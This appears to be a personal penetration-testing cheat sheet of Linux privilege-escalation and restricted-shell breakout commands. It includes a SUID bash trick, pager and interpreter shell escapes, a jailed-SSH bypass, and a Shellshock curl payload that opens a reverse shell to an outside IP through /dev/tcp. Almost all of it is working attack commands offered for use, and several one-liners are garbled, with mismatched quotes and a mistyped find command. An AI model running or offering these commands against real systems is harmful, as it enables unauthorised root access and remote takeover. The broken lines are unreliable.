[Interesting]
sh -c "cp $(which bash) .; chmod +s ./bash

./bash -p
====================================================================
sudo git -p --help
!/bin/bash //Pagination root Priviledge Escalation
====================================================================
===Restricted Shell? Try This ====
From Within Vi(type vi into the shell)
:set shell=/bin/bash
:shell

From within IRB:
exec "/bin/sh"

awk--> awk 'BEGIN {system("/bin/bash")}"
find--> find / -exec /usr/bin/awk "BEGIN {system("/bin/bash"))’ \;
perl--> perl -e ‘exec "/bin/bash

1. First for this method, find which bin file ‘awk’ is in
find / -name udev -exec /usr/bin/awk ‘BEGIN {system("/bin/bash -i)}" \;
====================================================================
=====Jailed SSH Shell? Try this.====
Initial Shell /bin/sh

If BASH is blocked.

Check the 'env' variable!

Linux will default to /bin/bash default bashrc if there is no present .bashrc

file in a User's home directory. Legit shell...)
1. ssh sara@127.0.0.1 */bin/sh"
2. cd $HOME
3. mv .bashrc .bashrc.BAK (Yes, this actually worked.)
4. exit
5. ssh sara@127.0.0.1

$ Bling Bling $
sara@skyTower:~$

Is python present on the target machine?
python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/sh")'

Is perl present on the target machine?
perl -e 'exec "/bin/bash";'
perl -e 'exec "/bin/sh";'

Is AWK present on the target machine?
awk 'BEGIN {system("/bin/bash -i")}'
awk 'BEGIN {system("/bin/sh -i")}'
Is ed present on the target machines?
ed
!sh

Is IRB Present on the target machine?
exec "/bin/sh"

Is Nmap present on the target machine?
nmap --interactive
nmap> !sh
===================================================================================
===AND EXPORT PATH ===
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color
alias ll='clear ; ls -lsaht --color=auto'
Ctrl + Z [Background Process]
stty raw -echo ; fg ; reset
stty columns 200 rows 200
====================================================================
====Once Broken Out - Before PrivEsc Reference - Perform These Commands==== 
====================================================================
find / -perm -2 ! -type 1 -1s 2>/dev/null |sort -r
-----------------------------------------------------------------------------
===Command to Print users that dont have /sbin/nologin as a shell===
grep -vE “nologin|false” etc/passwd
------------------------------------------------------------------------
====Other, misc=====
If you're on an engagement and you discover some /cgi-bin/ directory - it would be wise to fuzz for file names + ".cgi". 
Checking for CGI files either left behind from a default configuration or perhaps a developer who was utilizing it for debugging purposes is an important thing to check for.

Lets suppose you found something like /cgi-bin/superadmin.cgi during your engagement. The first thing that should come to your mind is "I wonder if it's shellshock vulnerable?".

nc -nlvp 9997
export CMD="bash -i >& /dev/tcp/192.168.1.6/9997 0>&1"
curl -H "User-Agent: () { :; }; /bin/bash -c 'echo aaaa; ${CMD}; echo zzzz;'" http://example.com/cgi-bin/superadmin.cgi

Shell.
------------------------------------------------------------------------------
nmap --interactive

nmap> !sh
====================================================================================
